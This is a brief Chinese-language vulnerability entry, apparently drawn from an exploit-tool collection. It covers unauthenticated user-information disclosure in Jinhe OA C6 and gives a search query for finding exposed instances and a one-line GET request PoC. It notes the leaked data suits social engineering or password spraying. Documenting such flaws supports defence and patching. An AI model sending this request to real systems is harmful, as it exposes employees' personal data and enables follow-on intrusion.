---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA UserWebControl 用户信息泄露漏洞

## 漏洞描述

金和OA C6 `/C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx` 接口未授权即可调用 `_method=GetDepartDataByDeptID` 方法，泄露部门与用户信息。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

```
GET /C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx?_method=GetDepartDataByDeptID&_session=no HTTP/1.1
```

无需登录，响应直接返回部门用户数据，可用于后续社工或密码喷洒。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
